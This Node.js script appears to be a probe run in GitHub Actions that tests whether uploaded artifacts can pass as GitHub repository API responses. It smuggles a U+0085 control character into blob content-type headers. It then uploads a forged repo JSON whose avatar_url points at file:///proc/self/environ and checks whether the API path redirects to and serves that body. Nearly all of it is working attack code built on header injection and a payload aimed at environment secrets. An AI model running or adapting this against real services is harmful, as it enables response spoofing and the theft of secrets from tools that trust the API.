import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const client = internalArtifactTwirpClient({maxAttempts: 1});
const repo = process.env.GITHUB_REPOSITORY;
const stamp = process.env.GITHUB_RUN_ID;
const cases = [
  ['allow-zip', 7, 'application/zip', false, '\u0085application/json'],
  ['allow-octet', 7, 'application/octet-stream', false, '\u0085application/json'],
  ['allow-gzip', 7, 'application/gzip', false, '\u0085application/json'],
  ['allow-tar', 7, 'application/x-tar', false, '\u0085application/json'],
  ['allow-svg', 7, 'image/svg+xml', false, '\u0085application/json'],
  ['allow-png', 7, 'image/png', false, '\u0085application/json'],
  ['allow-plain', 7, 'text/plain', false, '\u0085application/json'],
  ['allow-html', 7, 'text/html', false, '\u0085application/json'],
  ['allow-xml-app', 7, 'application/xml', false, '\u0085application/json'],
  ['allow-xml-text', 7, 'text/xml', false, '\u0085application/json'],
  ['allow-js', 7, 'application/javascript', false, '\u0085application/json'],
  ['allow-pdf', 7, 'application/pdf', false, '\u0085application/json'],
  ['allow-csv', 7, 'text/csv', false, '\u0085application/json'],
  ['allow-json-control', 7, 'application/json', false, '\u0085application/json'],
];

function sha(bytes) { return createHash('sha256').update(bytes).digest('hex'); }
function request(url, method='GET', body=null, headers={}) {
  return new Promise((resolve,reject) => {
    const target = new URL(url);
    const transport = target.protocol === 'https:' ? https : http;
    const req = transport.request(target,{method,headers,timeout:15000},res=>{
      const chunks=[];
      res.on('data',chunk=>chunks.push(chunk));
      res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(chunks)}));
    });
    req.on('error',reject);
    req.on('timeout',()=>req.destroy(new Error('timeout')));
    if(body)req.write(body);
    req.end();
  });
}
function headerHex(response,name){
  const out=[];
  for(let i=0;i<response.rawHeaders.length;i+=2){
    if(response.rawHeaders[i].toLowerCase()===name.toLowerCase())
      out.push(Buffer.from(response.rawHeaders[i+1],'latin1').toString('hex'));
  }
  return out;
}
async function upload(url, bytes, type){
  const response = await request(url,'PUT',bytes,{
    'x-ms-version':'2025-01-05',
    'x-ms-blob-type':'BlockBlob',
    'x-ms-blob-content-type':type,
    'Content-Type':'application/octet-stream',
    'Content-Length':String(bytes.length),
  });
  if(response.status!==201)throw new Error(`upload HTTP ${response.status} ${response.headers['x-ms-error-code']||''}`);
}
async function runCase([label,version,mime,omit,blobType]){
  const name=`repo-cassette-${stamp}-${label}.json`;
  const report={label,version,mimePreview: mime===null?null:JSON.stringify(mime).slice(0,120),mimeLength:mime===null?null:mime.length,blobTypeHex:Buffer.from(blobType,'latin1').toString('hex')};
  try{
    const args={...ids,name,version};
    if(!omit)args.mimeType=StringValue.create({value:mime});
    const created=await client.CreateArtifact(args);
    if(!created.ok)throw new Error('CreateArtifact returned ok=false');
    const placeholder=Buffer.from('{}');
    let activeBlobType=blobType;
    try{
      await upload(created.signedUploadUrl,placeholder,activeBlobType);
      report.blobTypeAccepted=true;
    }catch(error){
      report.blobUploadError=String(error.message||error).slice(0,100);
      activeBlobType='application/json';
      await upload(created.signedUploadUrl,placeholder,activeBlobType);
      report.blobTypeAccepted=false;
    }
    const done=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:`sha256:${sha(placeholder)}`})});
    if(!done.ok)throw new Error('FinalizeArtifact returned ok=false');
    const artifactId=String(done.artifactId);
    report.artifactId=artifactId;
    const repository=`${repo}/actions/artifacts/${artifactId}/zip`;
    const body=Buffer.from(JSON.stringify({full_name:repository,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette',stargazers_count:0}));
    await upload(created.signedUploadUrl,body,activeBlobType);
    report.bodySha256=sha(body);
    for(let retry=0;retry<12;retry++){
      const api=await request(`https://api.github.com/repos/${repository}`,'GET',null,{
        'Accept':'application/vnd.github.v3+json',
        'Authorization':`Bearer ${process.env.GITHUB_TOKEN}`,
        'User-Agent':'repo-cassette-carrier-probe',
      });
      report.githubStatus=api.status;
      if(api.status===404){await new Promise(r=>setTimeout(r,500));continue;}
      if(api.status!==302 || !api.headers.location)break;
      const location=new URL(api.headers.location);
      report.rsct=location.searchParams.get('rsct');
      const final=await request(location.href);
      report.finalStatus=final.status;
      report.contentTypeHex=headerHex(final,'Content-Type');
      report.bodyMatch=final.body.equals(body);
      break;
    }
  }catch(error){report.error=String(error.message||error).slice(0,180);}
  console.log('CARRIER',JSON.stringify(report));
}
for(const entry of cases){
  try{await runCase(entry)}catch(error){
    console.log('CARRIER_FATAL',JSON.stringify({label:entry[0],error:String(error.message||error).slice(0,180)}));
  }
}
